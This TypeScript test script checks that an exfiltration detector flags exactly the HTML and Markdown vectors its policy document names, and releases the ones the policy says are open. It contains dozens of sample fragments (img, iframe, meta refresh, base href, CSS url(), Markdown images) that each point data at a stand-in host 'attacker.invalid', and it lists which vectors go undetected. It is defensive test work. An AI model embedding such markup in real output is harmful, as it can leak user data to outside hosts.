// T71 — does the normative subsection describe THIS implementation, in both
// directions? T66#F-003's answer was "no in both", and a prose fix is worth
// exactly as much as the check that it still holds, so the check is mechanical.
//
// Three questions, each answered against the code rather than against the
// previous round's prose:
//   1. COVERED — every element/attribute pair the detector actually flags is
//      named in the subsection, and every pair the subsection names is flagged.
//      Membership is decided by RUNNING the detector on a minimal fragment, not
//      by re-reading the table, so a table the walker cannot reach would show up
//      as a doc-only claim.
//   2. MARKDOWN — the four image spellings the subsection now claims, and the
//      four link spellings it says are released, each driven through the
//      detector.
//   3. PROPERTIES — the three statements the subsection makes about HOW matching
//      works: ASCII case-insensitive element names, gates compared after
//      character-reference decoding, and exactly three departures from context
//      blindness (two narrowing, plus the disclosed <base href> cost).
//
// Read-only, offline, synthetic hosts only.
// Usage: bun T71-doc-parity.ts
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const flags = (content: string): boolean => detectExfil(content, []).length > 0;

// Every element/attribute pair the SUBSECTION names as covered, transcribed by
// hand from `policies.md` (the direction that catches a doc claim the code does
// not honour).
const documentedPairs: Array<[string, string]> = [
  ["img", `<img src="${U}">`],
  ["img srcset", `<img srcset="${U} 1x">`],
  ["image src", `<image src="${U}">`],
  ["image srcset", `<image srcset="${U} 1x">`],
  ["image href", `<svg><image href="${U}"/></svg>`],
  ["image xlink:href", `<svg><image xlink:href="${U}"/></svg>`],
  ["feImage href", `<svg><filter><feImage href="${U}"/></filter></svg>`],
  ["feImage xlink:href", `<svg><filter><feImage xlink:href="${U}"/></filter></svg>`],
  ["input type=image src", `<input type="image" src="${U}">`],
  ["video poster", `<video poster="${U}"></video>`],
  ["body background", `<body background="${U}">`],
  ["table background", `<table background="${U}">`],
  ["td background", `<td background="${U}">`],
  ["th background", `<th background="${U}">`],
  ["tr background", `<tr background="${U}">`],
  ["tbody background", `<tbody background="${U}">`],
  ["thead background", `<thead background="${U}">`],
  ["tfoot background", `<tfoot background="${U}">`],
  ["video src", `<video src="${U}"></video>`],
  ["audio src", `<audio src="${U}"></audio>`],
  ["source src", `<source src="${U}">`],
  ["source srcset", `<source srcset="${U} 1x">`],
  ["track src", `<track src="${U}">`],
  ["iframe src", `<iframe src="${U}"></iframe>`],
  ["embed src", `<embed src="${U}">`],
  ["object data", `<object data="${U}"></object>`],
  ["meta http-equiv=refresh", `<meta http-equiv="refresh" content="0;url=${U}">`],
  ["base href", `<base href="${U}">`],
];

// Everything the subsection says is NOT covered — deliberately open, or never.
const documentedReleased: Array<[string, string]> = [
  ["script src", `<script src="${U}"></script>`],
  ["svg script href", `<svg><script href="${U}"/></svg>`],
  ["link href", `<link rel="stylesheet" href="${U}">`],
  ["link imagesrcset", `<link rel="preload" as="image" imagesrcset="${U} 1x">`],
  ["style attribute url()", `<div style="background-image:url('${U}')">x</div>`],
  ["style block url()", `<style>.a{background:url(${U})}</style>`],
  ["css @import url()", `<style>@import url("${U}");</style>`],
  ["css @import bare string", `<style>@import "${U}";</style>`],
  ["css @font-face src", `<style>@font-face{font-family:x;src:url("${U}")}</style>`],
  ["css image-set()", `<div style="background-image:image-set('${U}' 1x)">x</div>`],
  ["iframe srcdoc", `<iframe srcdoc="&lt;img src=&quot;${U}&quot;&gt;"></iframe>`],
  ["frame src", `<frameset><frame src="${U}"></frameset>`],
  ["svg use href", `<svg><use href="${U}#icon"/></svg>`],
  ["a href", `<a href="${U}">go</a>`],
  ["a ping", `<a href="/x" ping="${U}">go</a>`],
  ["area href", `<area href="${U}">`],
  ["form action", `<form action="${U}"><input name="q"></form>`],
  ["button formaction", `<button formaction="${U}">go</button>`],
  ["input formaction", `<input type="submit" formaction="${U}">`],
];

const markdownCovered: Array<[string, string]> = [
  ["md inline image", `![a](${U})`],
  ["md inline image, bracketed description", `![a[b]c](${U})`],
  ["md full reference image", `![a][a]\n\n[a]: ${U}\n`],
  ["md collapsed reference image", `![a][]\n\n[a]: ${U}\n`],
  ["md shortcut reference image", `![a]\n\n[a]: ${U}\n`],
];
const markdownReleased: Array<[string, string]> = [
  ["md inline link", `[a](${U})`],
  ["md full reference link", `[a][a]\n\n[a]: ${U}\n`],
  ["md collapsed reference link", `[a][]\n\n[a]: ${U}\n`],
  ["md shortcut reference link", `[a]\n\n[a]: ${U}\n`],
];

const properties: Array<[string, boolean]> = [
  // "Имена сопоставляются ASCII-регистронезависимо … покрыт и компонентный markup"
  ["case-insensitive: <Video src>", flags(`<Video src="${U}" />`)],
  ["case-insensitive: <Iframe src>", flags(`<Iframe src="${U}" />`)],
  ["case-insensitive: <Embed src>", flags(`<Embed src="${U}" />`)],
  ["case-insensitive: <IMG SRC>", flags(`<IMG SRC="${U}">`)],
  // "Значения двух атрибутных gate … после декодирования character references"
  ["gate decoded: type=&#105;mage", flags(`<input type="&#105;mage" src="${U}">`)],
  [
    "gate decoded: http-equiv=&#114;efresh",
    flags(`<meta http-equiv="&#114;efresh" content="0;url=${U}">`),
  ],
  ["gate exact: type=&#105;mages stays released", !flags(`<input type="&#105;mages" src="${U}">`)],
  [
    "gate exact: http-equiv=refresh&#59; stays released",
    !flags(`<meta http-equiv="refresh&#59;" content="0;url=${U}">`),
  ],
  // "Вложенность и контекст не учитываются … тоже становится finding"
  ["context blind: inside an HTML comment", flags(`<!-- <img src="${U}"> -->`)],
  ["context blind: inside a fenced code block", flags("```html\n" + `<img src="${U}">` + "\n```")],
  ["context blind: inside <template>", flags(`<template><img src="${U}"></template>`)],
  ["context blind: <base> inside a comment", flags(`<!-- <base href="${U}"> -->`)],
  // departure 1 — markup inside another element's quoted value is NOT a finding
  [
    "narrowing 1: markup inside a quoted attribute value",
    !flags(`<img alt="<iframe src=${U}>" src="/a.png">`),
  ],
  // departure 2 — an unterminated quoted value suppresses the remainder
  [
    "narrowing 2: after an unterminated quoted value",
    !flags(`<td title="x <img src="${U}">`),
  ],
  // departure 3 — <base href> is NOT suppressed anywhere; the cost is disclosed
  [
    "base is flagged wherever it appears",
    flags(`<base href="${U}">`) && flags("```\n" + `<base href="${U}">` + "\n```"),
  ],
  [
    "base finding discloses the whole-document cost",
    (detectExfil(`<base href="${U}">`, [])[0]?.remediation ?? "").includes("EVERY relative URL"),
  ],
];

const docSaysCoveredButReleased = documentedPairs
  .concat(markdownCovered)
  .filter(([, fragment]) => !flags(fragment))
  .map(([id]) => id);
const docSaysReleasedButFlagged = documentedReleased
  .concat(markdownReleased)
  .filter(([, fragment]) => flags(fragment))
  .map(([id]) => id);
const propertyFailures = properties.filter(([, held]) => !held).map(([id]) => id);

for (const [id, fragment] of documentedPairs.concat(markdownCovered)) {
  console.log(`covered   ${id.padEnd(38)} flagged=${flags(fragment)}`);
}
for (const [id, fragment] of documentedReleased.concat(markdownReleased)) {
  console.log(`released  ${id.padEnd(38)} flagged=${flags(fragment)}`);
}
for (const [id, held] of properties) {
  console.log(`property  ${id.padEnd(38)} holds=${held}`);
}

console.log(
  JSON.stringify(
    {
      coveredRows: documentedPairs.length + markdownCovered.length,
      releasedRows: documentedReleased.length + markdownReleased.length,
      propertyRows: properties.length,
      docSaysCoveredButReleased,
      docSaysReleasedButFlagged,
      propertyFailures,
      parity:
        docSaysCoveredButReleased.length === 0 &&
        docSaysReleasedButFlagged.length === 0 &&
        propertyFailures.length === 0,
    },
    null,
    2,
  ),
);
